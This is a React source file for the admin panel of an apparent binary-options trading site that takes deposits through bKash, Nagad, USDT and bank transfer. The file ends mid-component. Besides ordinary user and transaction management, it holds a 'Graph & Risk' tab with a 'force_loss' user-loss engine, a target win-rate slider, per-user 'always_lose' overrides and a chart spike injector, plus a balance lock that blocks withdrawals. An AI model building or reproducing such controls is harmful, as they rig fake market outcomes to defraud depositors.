import React, { useState, useEffect } from 'react';
import { UserAccount } from '../../types/trading';
import { FirebaseService } from '../../utils/firebaseSync';
import { 
  Users, 
  ArrowLeft, 
  Shield, 
  DollarSign, 
  CheckCircle, 
  XCircle, 
  RefreshCw, 
  Settings, 
  Wallet,
  Search,
  Check,
  X,
  Lock,
  Unlock,
  Ban,
  UserCheck,
  PlusCircle,
  MinusCircle,
  Gift,
  Edit3,
  CreditCard
} from 'lucide-react';

interface AdminDashboardProps {
  onBackToTrade: () => void;
  currentUser?: UserAccount | null;
}

export const AdminDashboard: React.FC<AdminDashboardProps> = ({
  onBackToTrade,
  currentUser: _currentUser
}) => {
  const [activeTab, setActiveTab] = useState<'users' | 'transactions' | 'settings' | 'gateways' | 'kyc' | 'graph'>('users');
  const [users, setUsers] = useState<any[]>([]);
  const [transactions, setTransactions] = useState<any[]>([]);
  const [gateways, setGateways] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [actionMessage, setActionMessage] = useState('');

  // Telegram & Support Settings
  const [supportSettings, setSupportSettings] = useState<any>(() => {
    const saved = localStorage.getItem('qx_support_settings');
    return saved ? JSON.parse(saved) : {
      telegramUrl: 'https://t.me/Quotex_Support_BD',
      whatsappNumber: '+8801700000000',
      email: 'support@nux-trading.com',
      noticeBanner: '🚀 Instant Automated Deposits & 24/7 Fast Withdrawals via bKash, Nagad & Crypto!',
      platformName: 'NUX Trading Platform',
      depositBonus: 50
    };
  });

  // Graph Control & Manipulation State
  const [graphControls, setGraphControls] = useState<any>(() => {
    const saved = localStorage.getItem('qx_graph_controls');
    return saved ? JSON.parse(saved) : {
      globalMode: 'normal', // 'normal' | 'force_win' | 'force_loss' | 'bull_trend' | 'bear_trend'
      winRatePercent: 70,
      userOverrides: {}, // email -> 'always_win' | 'always_lose' | 'normal'
      spikeSignal: null
    };
  });
  
  // Modal for advanced user balance/status management
  const [managingUser, setManagingUser] = useState<any | null>(null);
  const [customBalanceInput, setCustomBalanceInput] = useState('');
  const [bonusInput, setBonusInput] = useState('');

  // Gateway management state
  const [editingGatewayIndex, setEditingGatewayIndex] = useState<number | null>(null);
  const [gatewayForm, setGatewayForm] = useState<any>({});

  const loadAdminData = async () => {
    setLoading(true);
    try {
      const fetchedUsers = await FirebaseService.fetchUsers();
      const fetchedTx = await FirebaseService.fetchTransactions();
      const fetchedGateways = await FirebaseService.fetchGateways();
      
      // Merge Firestore users with local registered users
      let combinedUsers = [...fetchedUsers];
      try {
        const localRaw = localStorage.getItem('qx_registered_users');
        const localList = localRaw ? JSON.parse(localRaw) : [];
        localList.forEach((lu: any) => {
          const emailVal = (lu.email || '').toLowerCase();
          if (emailVal && !combinedUsers.some((u: any) => (u.email || u.username || '').toLowerCase() === emailVal)) {
            combinedUsers.push({
              id: emailVal.replace(/[^a-zA-Z0-9_-]/g, '_'),
              email: emailVal,
              username: emailVal,
              fullName: lu.name || emailVal.split('@')[0],
              role: lu.role || 'user',
              balance: 0,
              demoBalance: 10000,
              accountStatus: 'active',
              verificationStatus: 'verified',
              createdAt: new Date().toISOString()
            });
          }
        });
      } catch (e) {
        console.warn('Local users merge error:', e);
      }

      setUsers(combinedUsers);
      setTransactions(fetchedTx);
      
      if (fetchedGateways && fetchedGateways.length > 0) {
        setGateways(fetchedGateways);
      } else {
        // Fallback default gateways if empty
        setGateways([
          {
            id: 'bkash',
            name: 'bKash (BD)',
            category: 'mobile_banking',
            icon: 'https://i.postimg.cc/MZNd4Pjq/55.png',
            active: true,
            sendMoneyNumber: '01700000001',
            merchantNumber: '01700000002',
            cashOutNumber: '01700000003',
            instruction: 'Send money to the given bKash number and enter your TrxID.',
            minDeposit: 10,
            maxDeposit: 1000
          },
          {
            id: 'nagad',
            name: 'Nagad (BD)',
            category: 'mobile_banking',
            icon: 'https://i.postimg.cc/QtxT0K9p/images-2-removebg-preview.png',
            active: true,
            sendMoneyNumber: '01700000001',
            merchantNumber: '01700000002',
            cashOutNumber: '01700000003',
            instruction: 'Send money to the given Nagad number and enter your TrxID.',
            minDeposit: 10,
            maxDeposit: 1000
          },
          {
            id: 'rocket',
            name: 'DBBL Rocket (BD)',
            category: 'mobile_banking',
            icon: 'https://i.postimg.cc/85zP3G4c/rocket.png',
            active: true,
            sendMoneyNumber: '01700000004-9',
            merchantNumber: '01700000005-9',
            cashOutNumber: '',
            instruction: 'Send money to Rocket wallet and submit Transaction ID.',
            minDeposit: 10,
            maxDeposit: 1000
          },
          {
            id: 'upay',
            name: 'Upay (BD)',
            category: 'mobile_banking',
            icon: 'https://i.postimg.cc/bv2KjJ9g/upay.png',
            active: true,
            sendMoneyNumber: '01700000006',
            merchantNumber: '',
            cashOutNumber: '',
            instruction: 'Transfer to Upay number and enter TrxID.',
            minDeposit: 10,
            maxDeposit: 1000
          },
          {
            id: 'usdt',
            name: 'Tether USDT (TRC20)',
            category: 'crypto',
            icon: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
            active: true,
            sendMoneyNumber: 'T9xR2yZ...WalletAddressTRC20',
            merchantNumber: '',
            cashOutNumber: '',
            instruction: 'Send TRC20 USDT to wallet address and provide Hash/TxID.',
            minDeposit: 10,
            maxDeposit: 50000
          },
          {
            id: 'bank',
            name: 'Bank Transfer (BD/Global)',
            category: 'bank',
            icon: 'https://cdn-icons-png.flaticon.com/512/2830/2830284.png',
            active: true,
            sendMoneyNumber: 'A/C: 1234567890 (NUX Trading Ltd)',
            merchantNumber: '',
            cashOutNumber: '',
            instruction: 'Deposit to company bank account and upload reference receipt.',
            minDeposit: 50,
            maxDeposit: 100000
          },
          {
            id: 'perfect_money',
            name: 'Perfect Money',
            category: 'e_wallet',
            icon: 'https://perfectmoney.is/img/logo.png',
            active: true,
            sendMoneyNumber: 'U12345678',
            merchantNumber: '',
            cashOutNumber: '',
            instruction: 'Send USD to Perfect Money Account U12345678.',
            minDeposit: 10,
            maxDeposit: 10000
          }
        ]);
      }
    } catch (err) {
      console.warn('Failed to load admin data:', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    loadAdminData();
  }, []);

  const handleSaveUserManagement = async () => {
    if (!managingUser) return;
    try {
      const email = managingUser.email;
      const newBal = customBalanceInput !== '' ? parseFloat(customBalanceInput) : Number(managingUser.balance || 0);
      const newBonus = bonusInput !== '' ? parseFloat(bonusInput) : Number(managingUser.bonus || 0);

      const updatedData = {
        ...managingUser,
        balance: isNaN(newBal) ? Number(managingUser.balance || 0) : newBal,
        bonus: isNaN(newBonus) ? Number(managingUser.bonus || 0) : newBonus,
        lastUpdated: new Date().toISOString()
      };

      await FirebaseService.syncUser(updatedData);
      setActionMessage(`Successfully updated profile for ${email}`);
      setManagingUser(null);
      setCustomBalanceInput('');
      setBonusInput('');
      loadAdminData();
      setTimeout(() => setActionMessage(''), 4000);
    } catch (err) {
      alert('Failed to update user profile');
    }
  };

  const handleToggleBlockUser = async (user: any) => {
    try {
      const newStatus = user.accountStatus === 'blocked' ? 'active' : 'blocked';
      await FirebaseService.syncUser({
        ...user,
        accountStatus: newStatus
      });
      setActionMessage(`User ${user.email} is now ${newStatus}`);
      loadAdminData();
      setTimeout(() => setActionMessage(''), 4000);
    } catch (err) {
      alert('Failed to update user status');
    }
  };

  const handleToggleLockBalance = async (user: any) => {
    try {
      const newLockState = !user.balanceLocked;
      await FirebaseService.syncUser({
        ...user,
        balanceLocked: newLockState
      });
      setActionMessage(`Balance for ${user.email} is now ${newLockState ? 'LOCKED (Withdrawal & Trading restricted)' : 'UNLOCKED'}`);
      loadAdminData();
      setTimeout(() => setActionMessage(''), 4000);
    } catch (err) {
      alert('Failed to toggle balance lock');
    }
  };

  const handleApproveTransaction = async (tx: any) => {
    try {
      tx.status = 'approved';
      await FirebaseService.syncTransaction(tx);

      // If deposit or bonus, add to user balance in Firestore
      if ((tx.type === 'deposit' || tx.type === 'bonus') && tx.userId) {
        const targetUser = users.find(u => u.email === tx.userId || u.id === tx.userId);
        if (targetUser) {
          const currentBal = Number(targetUser.balance || 0);
          const addedAmt = Number(tx.amount || 0);
          const bonusAmt = Number(tx.bonus || 0);
          const totalAdd = addedAmt + bonusAmt;
          await FirebaseService.updateUserBalance(targetUser.email, currentBal + totalAdd, 'live');
        }
      }

      setActionMessage(`Transaction ${tx.id} approved successfully!`);
      loadAdminData();
      setTimeout(() => setActionMessage(''), 4000);
    } catch (err) {
      alert('Failed to approve transaction');
    }
  };

  const handleRejectTransaction = async (tx: any) => {
    try {
      tx.status = 'rejected';
      await FirebaseService.syncTransaction(tx);
      
      // If withdrawal is rejected, refund the user balance
      if (tx.type === 'withdrawal' && tx.userId) {
        const targetUser = users.find(u => u.email === tx.userId || u.id === tx.userId);
        if (targetUser) {
          const currentBal = Number(targetUser.balance || 0);
          const refundedAmt = Number(tx.amount || 0);
          await FirebaseService.updateUserBalance(targetUser.email, currentBal + refundedAmt, 'live');
        }
      }

      setActionMessage(`Transaction ${tx.id} rejected.`);
      loadAdminData();
      setTimeout(() => setActionMessage(''), 4000);
    } catch (err) {
      alert('Failed to reject transaction');
    }
  };

  const filteredUsers = users.filter(u => 
    (u.email || '').toLowerCase().includes(searchTerm.toLowerCase()) ||
    (u.fullName || '').toLowerCase().includes(searchTerm.toLowerCase()) ||
    (u.username || '').toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="flex flex-col h-full bg-[#0a0e17] text-slate-100 overflow-y-auto select-none">
      {/* Admin Top Header */}
      <div className="flex items-center justify-between px-6 py-4 bg-[#0d121b] border-b border-white/10 shrink-0">
        <div className="flex items-center space-x-3">
          <button
            onClick={onBackToTrade}
            className="flex items-center space-x-1.5 px-3 py-1.5 bg-white/5 hover:bg-white/10 border border-white/10 rounded-xl text-xs font-bold text-slate-300 hover:text-white transition-all cursor-pointer"
          >
            <ArrowLeft className="w-4 h-4" />
            <span>Back to Trading</span>
          </button>
          <div className="flex items-center space-x-2">
            <div className="w-8 h-8 rounded-xl bg-gradient-to-tr from-amber-500 to-emerald-500 flex items-center justify-center text-black font-black shadow-lg shadow-emerald-500/20">
              <Shield className="w-4 h-4" />
            </div>
            <div>
              <h1 className="text-base font-black tracking-tight text-white flex items-center gap-2">
                <span>Admin Master Control Panel</span>
                <span className="px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400 text-[10px] font-bold border border-emerald-500/30">
                  Firebase Live
                </span>
              </h1>
              <p className="text-[11px] text-slate-400">Complete control: Edit Balances, Add Bonus, Lock Balances, Block Users & Approve Transactions</p>
            </div>
          </div>
        </div>

        <div className="flex items-center space-x-3">
          <button
            onClick={loadAdminData}
            className="flex items-center space-x-1 px-3 py-1.5 bg-emerald-500/10 hover:bg-emerald-500/20 border border-emerald-500/30 text-emerald-400 rounded-xl text-xs font-bold transition-all cursor-pointer"
          >
            <RefreshCw className={`w-3.5 h-3.5 ${loading ? 'animate-spin' : ''}`} />
            <span>Sync Firestore</span>
          </button>
        </div>
      </div>

      {actionMessage && (
        <div className="mx-6 mt-4 p-3 bg-emerald-500/20 border border-emerald-500/30 text-emerald-300 rounded-xl text-xs font-semibold flex items-center gap-2">
          <CheckCircle className="w-4 h-4 text-emerald-400 shrink-0" />
          <span>{actionMessage}</span>
        </div>
      )}

      {/* Tabs */}
      <div className="flex items-center space-x-2 px-4 sm:px-6 pt-4 border-b border-white/10 bg-[#0d121b]/50 overflow-x-auto scrollbar-none">
        <button
          onClick={() => setActiveTab('users')}
          className={`flex items-center space-x-2 px-4 py-3 border-b-2 font-bold text-xs transition-all cursor-pointer shrink-0 ${
            activeTab === 'users' ? 'border-emerald-500 text-emerald-400' : 'border-transparent text-slate-400 hover:text-white'
          }`}
        >
          <Users className="w-4 h-4" />
          <span>Users ({users.length})</span>
        </button>
        <button
          onClick={() => setActiveTab('transactions')}
          className={`flex items-center space-x-2 px-4 py-3 border-b-2 font-bold text-xs transition-all cursor-pointer shrink-0 ${
            activeTab === 'transactions' ? 'border-emerald-500 text-emerald-400' : 'border-transparent text-slate-400 hover:text-white'
          }`}
        >
          <Wallet className="w-4 h-4" />
          <span>Transactions ({transactions.length})</span>
        </button>
        <button
          onClick={() => setActiveTab('gateways')}
          className={`flex items-center space-x-2 px-4 py-3 border-b-2 font-bold text-xs transition-all cursor-pointer shrink-0 ${
            activeTab === 'gateways' ? 'border-emerald-500 text-emerald-400' : 'border-transparent text-slate-400 hover:text-white'
          }`}
        >
          <CreditCard className="w-4 h-4" />
          <span>Gateways</span>
        </button>
        <button
          onClick={() => setActiveTab('graph')}
          className={`flex items-center space-x-2 px-4 py-3 border-b-2 font-bold text-xs transition-all cursor-pointer shrink-0 ${
            activeTab === 'graph' ? 'border-emerald-500 text-emerald-400' : 'border-transparent text-slate-400 hover:text-white'
          }`}
        >
          <Edit3 className="w-4 h-4 text-amber-400" />
          <span>Graph & Risk</span>
        </button>
        <button
          onClick={() => setActiveTab('settings')}
          className={`flex items-center space-x-2 px-4 py-3 border-b-2 font-bold text-xs transition-all cursor-pointer shrink-0 ${
            activeTab === 'settings' ? 'border-emerald-500 text-emerald-400' : 'border-transparent text-slate-400 hover:text-white'
          }`}
        >
          <Settings className="w-4 h-4" />
          <span>Support & Links</span>
        </button>
        <button
          onClick={() => setActiveTab('kyc')}
          className={`flex items-center space-x-2 px-4 py-3 border-b-2 font-bold text-xs transition-all cursor-pointer shrink-0 ${
            activeTab === 'kyc' ? 'border-emerald-500 text-emerald-400' : 'border-transparent text-slate-400 hover:text-white'
          }`}
        >
          <Shield className="w-4 h-4" />
          <span>KYC Verification</span>
        </button>
      </div>

      {/* Content Area */}
      <div className="p-4 sm:p-6">
        {activeTab === 'users' && (
          <div className="space-y-4">
            <div className="flex items-center justify-between gap-4">
              <div className="relative flex-1 max-w-md">
                <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
                <input
                  type="text"
                  placeholder="Search users by email, name or username..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="w-full bg-[#121824] border border-white/10 rounded-xl pl-10 pr-4 py-2 text-xs text-white placeholder-slate-500 focus:outline-none focus:border-emerald-500"
                />
              </div>
              <div className="text-xs text-slate-400 font-medium">
                Total Firestore Users: <strong className="text-white font-mono">{users.length}</strong>
              </div>
            </div>

            <div className="bg-[#121824] border border-white/10 rounded-2xl overflow-hidden shadow-xl">
              <div className="overflow-x-auto">
                <table className="w-full text-left border-collapse text-xs">
                  <thead>
                    <tr className="bg-white/5 border-b border-white/10 text-slate-400 uppercase tracking-wider text-[10px]">
                      <th className="p-4">User Email / ID</th>
                      <th className="p-4">Full Name</th>
                      <th className="p-4">Status / Lock</th>
                      <th className="p-4">Live Balance</th>
                      <th className="p-4">Bonus</th>
                      <th className="p-4 text-right">Admin Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-white/5">
                    {loading ? (
                      <tr>
                        <td colSpan={6} className="p-8 text-center text-slate-500">
                          Loading Firestore users...
                        </td>
                      </tr>
                    ) : filteredUsers.length === 0 ? (
                      <tr>
                        <td colSpan={6} className="p-8 text-center text-slate-500">
                          No users found matching your search.
                        </td>
                      </tr>
                    ) : (
                      filteredUsers.map((u, i) => (
                        <tr key={u.id || i} className="hover:bg-white/[0.02] transition-colors">
                          <td className="p-4 font-mono font-bold text-white flex items-center gap-2">
                            <div className="w-7 h-7 rounded-lg bg-emerald-500/10 text-emerald-400 flex items-center justify-center text-xs font-bold">
                              {(u.email || 'U').charAt(0).toUpperCase()}
                            </div>
                            <div>
                              <div>{u.email}</div>
                              <div className="text-[10px] text-slate-500">{u.id}</div>
                            </div>
                          </td>
                          <td className="p-4 text-slate-300 font-semibold">{u.fullName || u.username || 'N/A'}</td>
                          <td className="p-4 space-x-1">
                            <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold ${
                              u.accountStatus === 'blocked' ? 'bg-rose-500/20 text-rose-400 border border-rose-500/30' : 'bg-emerald-500/20 text-emerald-400'
                            }`}>
                              {u.accountStatus === 'blocked' ? 'Blocked' : 'Active'}
                            </span>
                            {u.balanceLocked && (
                              <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-amber-500/20 text-amber-400 border border-amber-500/30">
                                Locked
                              </span>
                            )}
                          </td>
                          <td className="p-4 font-mono font-extrabold text-emerald-400">
                            ${Number(u.balance || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}
                          </td>
                          <td className="p-4 font-mono text-amber-400">
                            +${Number(u.bonus || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}
                          </td>
                          <td className="p-4 text-right space-x-1.5">
                            <button
                              onClick={() => {
                                setManagingUser(u);
                                setCustomBalanceInput(String(u.balance || 0));
                                setBonusInput(String(u.bonus || 0));
                              }}
                              className="px-2.5 py-1.5 bg-emerald-500/10 hover:bg-emerald-500/20 border border-emerald-500/30 text-emerald-400 font-bold rounded-xl transition-all cursor-pointer inline-flex items-center gap-1"
                              title="Edit Balance & Bonus"
                            >
                              <Edit3 className="w-3.5 h-3.5" />
                              <span>Edit Balance</span>
                            </button>
                            <button
                              onClick={() => handleToggleLockBalance(u)}
                              className={`px-2.5 py-1.5 border font-bold rounded-xl transition-all cursor-pointer inline-flex items-center gap-1 ${
                                u.balanceLocked ? 'bg-amber-500/20 border-amber-500/30 text-amber-400' : 'bg-white/5 border-white/10 text-slate-300 hover:text-white'
                              }`}
                              title="Lock/Unlock Balance (Prevent Withdrawal)"
                            >
                              {u.balanceLocked ? <Lock className="w-3.5 h-3.5" /> : <Unlock className="w-3.5 h-3.5" />}
                              <span>{u.balanceLocked ? 'Unlock' : 'Lock'}</span>
                            </button>
                            <button
                              onClick={() => handleToggleBlockUser(u)}
                              className={`px-2.5 py-1.5 border font-bold rounded-xl transition-all cursor-pointer inline-flex items-center gap-1 ${
                                u.accountStatus === 'blocked' ? 'bg-emerald-500/20 border-emerald-500/30 text-emerald-400' : 'bg-rose-500/10 border-rose-500/30 text-rose-400'
                              }`}
                              title="Block or Unblock User"
                            >
                              {u.accountStatus === 'blocked' ? <UserCheck className="w-3.5 h-3.5" /> : <Ban className="w-3.5 h-3.5" />}
                              <span>{u.accountStatus === 'blocked' ? 'Unblock' : 'Block'}</span>
                            </button>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'transactions' && (
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <h2 className="text-sm font-bold text-white">Deposit & Withdrawal Requests</h2>
              <div className="text-xs text-slate-400">Total Requests: <strong className="text-white font-mono">{transactions.length}</strong></div>
            </div>

            <div className="bg-[#121824] border border-white/10 rounded-2xl overflow-hidden shadow-xl">
              <div className="overflow-x-auto">
                <table className="w-full text-left border-collapse text-xs">
                  <thead>
                    <tr className="bg-white/5 border-b border-white/10 text-slate-400 uppercase tracking-wider text-[10px]">
                      <th className="p-4">Tx ID / Gateway</th>
                      <th className="p-4">User</th>
                      <th className="p-4">Type</th>
                      <th className="p-4">Amount</th>
                      <th className="p-4">TrxID / Details</th>
                      <th className="p-4">Status</th>
                      <th className="p-4 text-right">Admin Actions</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-white/5">
                    {transactions.length === 0 ? (
                      <tr>
                        <td colSpan={7} className="p-8 text-center text-slate-500">
                          No deposit or withdrawal requests found in Firestore yet.
                        </td>
                      </tr>
                    ) : (
                      transactions.map((tx, i) => (
                        <tr key={tx.id || i} className="hover:bg-white/[0.02] transition-colors">
                          <td className="p-4">
                            <div className="font-mono font-bold text-white">{tx.id}</div>
                            <div className="text-[10px] text-slate-400 uppercase">{tx.gateway}</div>
                          </td>
                          <td className="p-4 font-semibold text-slate-300">{tx.userId}</td>
                          <td className="p-4">
                            <span className={`px-2 py-0.5 rounded-full text-[10px] font-bold uppercase ${
                              tx.type === 'deposit' ? 'bg-emerald-500/20 text-emerald-400' : 'bg-rose-500/20 text-rose-400'
                            }`}>
                              {tx.type}
                            </span>
                          </td>
                          <td className="p-4 font-mono font-extrabold text-white">
                            ${Number(tx.amount || 0).toFixed(2)}
                            {Number(tx.bonus || 0) > 0 && <span className="text-amber-400 text-[10px] ml-1">(+${tx.bonus} bonus)</span>}
                          </td>
                          <td className="p-4 font-mono text-slate-400">
                            {tx.trxId || 'N/A'}
                          </td>
                          <td className="p-4">
                            <span className={`px-2.5 py-1 rounded-full text-[10px] font-bold uppercase ${
                              tx.status === 'approved' ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' :
                              tx.status === 'rejected' ? 'bg-rose-500/20 text-rose-400 border border-rose-500/30' :
                              'bg-amber-500/20 text-amber-400 border border-amber-500/30 animate-pulse'
                            }`}>
                              {tx.status || 'pending'}
                            </span>
                          </td>
                          <td className="p-4 text-right space-x-2">
                            {tx.status !== 'approved' && (
                              <button
                                onClick={() => handleApproveTransaction(tx)}
                                className="px-3 py-1.5 bg-emerald-500 hover:bg-emerald-400 text-black font-extrabold rounded-xl transition-all cursor-pointer inline-flex items-center gap-1"
                              >
                                <Check className="w-3.5 h-3.5 stroke-[3]" />
                                <span>Approve</span>
                              </button>
                            )}
                            {tx.status !== 'rejected' && (
                              <button
                                onClick={() => handleRejectTransaction(tx)}
                                className="px-3 py-1.5 bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/30 text-rose-400 font-bold rounded-xl transition-all cursor-pointer inline-flex items-center gap-1"
                              >
                                <X className="w-3.5 h-3.5" />
                                <span>Reject</span>
                              </button>
                            )}
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'settings' && (
          <div className="space-y-6 max-w-2xl">
            <div className="bg-[#121824] border border-white/10 rounded-2xl p-6 shadow-xl space-y-4">
              <h2 className="text-sm font-bold text-white flex items-center gap-2">
                <Settings className="w-4 h-4 text-emerald-400" />
                <span>Platform Controls & Support Configuration</span>
              </h2>
              <p className="text-xs text-slate-400">Configure global platform options, deposit bonuses, and official Telegram customer support channel.</p>

              <div className="space-y-4 pt-2">
                <div>
                  <label className="block text-xs font-bold text-slate-300 mb-1">Platform Name</label>
                  <input
                    type="text"
                    value={supportSettings.platformName || 'NUX Trading Platform'}
                    onChange={(e) => setSupportSettings({ ...supportSettings, platformName: e.target.value })}
                    className="w-full bg-[#0a0e17] border border-white/10 rounded-xl px-4 py-2.5 text-xs text-white focus:outline-none focus:border-emerald-500"
                  />
                </div>

                <div>
                  <label className="block text-xs font-bold text-slate-300 mb-1">Telegram Support Channel / Username Link</label>
                  <input
                    type="text"
                    value={supportSettings.telegramUrl || ''}
                    onChange={(e) => setSupportSettings({ ...supportSettings, telegramUrl: e.target.value })}
                    placeholder="https://t.me/Quotex_Support_BD or @Quotex_Support_BD"
                    className="w-full bg-[#0a0e17] border border-white/10 rounded-xl px-4 py-2.5 text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                  />
                  <p className="text-[10px] text-slate-400 mt-1">This Telegram link will be opened when users click 24/7 Support in app.</p>
                </div>

                <div>
                  <label className="block text-xs font-bold text-slate-300 mb-1">WhatsApp Customer Support Number</label>
                  <input
                    type="text"
                    value={supportSettings.whatsappNumber || ''}
                    onChange={(e) => setSupportSettings({ ...supportSettings, whatsappNumber: e.target.value })}
                    placeholder="+8801700000000"
                    className="w-full bg-[#0a0e17] border border-white/10 rounded-xl px-4 py-2.5 text-xs text-white font-mono focus:outline-none focus:border-emerald-500"
                  />
                </div>

                <div>
                  <label className="block text-xs font-bold text-slate-300 mb-1">Default Deposit Bonus (%)</label>
                  <input
                    type="number"
                    value={supportSettings.depositBonus || 50}
                    onChange={(e) => setSupportSettings({ ...supportSettings, depositBonus: Number(e.target.value) })}
                    className="w-full bg-[#0a0e17] border border-white/10 rounded-xl px-4 py-2.5 text-xs text-white focus:outline-none focus:border-emerald-500"
                  />
                </div>

                <div>
                  <label className="block text-xs font-bold text-slate-300 mb-1">Notice Banner Announcement</label>
                  <input
                    type="text"
                    value={supportSettings.noticeBanner || '🚀 Instant Automated Deposits & 24/7 Fast Withdrawals via bKash, Nagad & Crypto!'}
                    onChange={(e) => setSupportSettings({ ...supportSettings, noticeBanner: e.target.value })}
                    className="w-full bg-[#0a0e17] border border-white/10 rounded-xl px-4 py-2.5 text-xs text-white focus:outline-none focus:border-emerald-500"
                  />
                </div>

                <button
                  onClick={async () => {
                    localStorage.setItem('qx_support_settings', JSON.stringify(supportSettings));
                    const success = await FirebaseService.syncSettings(supportSettings);
                    if (success) {
                      setActionMessage('Platform & Telegram Support settings updated successfully!');
                      setTimeout(() => setActionMessage(''), 4000);
                    } else {
                      alert('Sync failed. Settings saved locally only.');
                    }
                  }}
                  className="px-5 py-2.5 bg-emerald-500 hover:bg-emerald-400 text-black text-xs font-black rounded-xl transition-all shadow-lg shadow-emerald-500/20 cursor-pointer"
                >
                  Save Settings & Sync Telegram
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Graph & Risk Controls Tab */}
        {activeTab === 'graph' && (
          <div className="space-y-6 max-w-4xl">
            <div className="bg-[#121824] border border-white/10 rounded-2xl p-6 shadow-xl space-y-5">
              <div className="flex items-center justify-between border-b border-white/10 pb-4">
                <div>
                  <h2 className="text-sm font-bold text-white flex items-center gap-2">
                    <Edit3 className="w-4 h-4 text-amber-400" />
                    <span>Trading Graph Control & Risk Engine</span>
                  </h2>
                  <p className="text-xs text-slate-400 mt-0.5">Control live market graph algorithms, global trade win/loss percentage, and user target outcomes.</p>
                </div>
                <span className="px-3 py-1 rounded-full bg-amber-500/20 text-amber-400 border border-amber-500/30 text-xs font-bold font-mono">
                  Algorithm Active
                </span>
              </div>

              {/* Global Market Mode */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="space-y-2">
                  <label className="block text-xs font-bold text-slate-300">Global Market Graph Mode</label>
                  <select
                    value={graphControls.globalMode || 'normal'}
                    onChange={(e) => {
                      const updated = { ...graphControls, globalMode: e.target.value };
                      setGraphControls(updated);
                      localStorage.setItem('qx_graph_controls', JSON.stringify(updated));
                    }}
                    className="w-full bg-[#0a0e17] border border-white/10 rounded-xl px-4 py-2.5 text-xs text-white focus:outline-none focus:border-emerald-500 font-semibold"
                  >
                    <option value="normal">🌐 Normal Dynamic Market Simulation</option>
                    <option value="force_win">🟢 Force High Win Rate Mode (75%+ Win Rate)</option>
                    <option value="force_loss">🔴 Force High Loss Rate Mode (User Loss Engine)</option>
                    <option value="bull_trend">📈 Force Strong Bullish Upward Trend (+2.5%)</option>
                    <option value="bear_trend">📉 Force Strong Bearish Downward Trend (-2.5%)</option>
                  </select>
                  <p className="text-[11px] text-slate-400">Controls how graph candles resolve trades globally across all active pairs.</p>
                </div>

                <div className="space-y-2">
                  <label className="block text-xs font-bold text-slate-300">Target Global Win Rate: <span className="font-mono text-emerald-400">{graphControls.winRatePercent}%</span></label>
                  <input
                    type="range"
                    min="0"
                    max="100"
                    step="5"
                    value={graphControls.winRatePercent || 70}
                    onChange={(e) => {
                      const updated = { ...graphControls, winRatePercent: Number(e.target.value) };
                      setGraphControls(updated);
                      localStorage.setItem('qx_graph_controls', JSON.stringify(updated));
                    }}
                    className="w-full accent-emerald-500 cursor-pointer"
                  />
                  <div className="flex justify-between text-[10px] font-mono text-slate-400">
                    <span>0% (100% Loss)</span>
                    <span>50% (Fair)</span>
                    <span>100% (100% Win)</span>
                  </div>
                </div>
              </div>

              {/* Instant Graph Spike Injector */}
              <div className="pt-4 border-t border-white/10 space-y-3">
                <h3 className="text-xs font-bold text-white flex items-center gap-2">
                  <span>Realtime Live Chart Spike Injector</span>
                  <span className="text-[10px] text-slate-400 font-normal">(Triggers an immediate price movement spike on active chart)</span>
                </h3>

                <div className="flex flex-wrap gap-3">
                  <button
                    onClick={() => {
                      const updated = {
                        ...graphControls,
                        spikeSignal: { direction: 'up', magnitude: 0.015, timestamp: Date.now() }
                      };
                      setGraphControls(updated);
                      localStorage.setItem('qx_graph_controls', JSON.stringify(updated));
                      setActionMessage('📈 Bullish Spike (+1.5%) injected onto active chart!');
                      setTimeout(() => setActionMessage(''), 4000);
                    }}
                    className="px-4 py-2.5 bg-emerald-500/20 hover:bg-emerald-500 text-emerald-400 hover:text-black border border-emerald-500/30 rounded-xl text-xs font-bold transition-all cursor-pointer flex items-center gap-1.5"
                  >
                    <span>📈 Inject Bull Spike (+1.5%)</span>
                  </button>

                  <button
                    onClick={() => {
                      const updated = {
                        ...graphControls,
                        spikeSignal: { direction: 'down', magnitude: 0.015, timestamp: Date.now() }
                      };
                      setGraphControls(updated);
                      localStorage.setItem('qx_graph_controls', JSON.stringify(updated));
                      setActionMessage('📉 Bearish Spike (-1.5%) injected onto active chart!');
                      setTimeout(() => setActionMessage(''), 4000);
                    }}
                    className="px-4 py-2.5 bg-rose-500/20 hover:bg-rose-500 text-rose-400 hover:text-white border border-rose-500/30 rounded-xl text-xs font-bold transition-all cursor-pointer flex items-center gap-1.5"
                  >
                    <span>📉 Inject Bear Spike (-1.5%)</span>
                  </button>
                </div>
              </div>

              {/* Targeted User Specific Override Table */}
              <div className="pt-4 border-t border-white/10 space-y-3">
                <h3 className="text-xs font-bold text-white">Targeted User Graph Outcome Overrides</h3>
                <div className="bg-[#0a0e17] border border-white/10 rounded-xl p-3 overflow-x-auto">
                  <table className="w-full text-left text-xs">
                    <thead>
                      <tr className="border-b border-white/10 text-slate-400 uppercase text-[10px]">
                        <th className="pb-2">User Email</th>
                        <th className="pb-2">Current Balance</th>
                        <th className="pb-2 text-right">Specific Outcome Control</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-white/5">
                      {users.slice(0, 8).map((u) => {
                        const currentOverride = graphControls.userOverrides?.[u.email] || 'normal';
                        return (
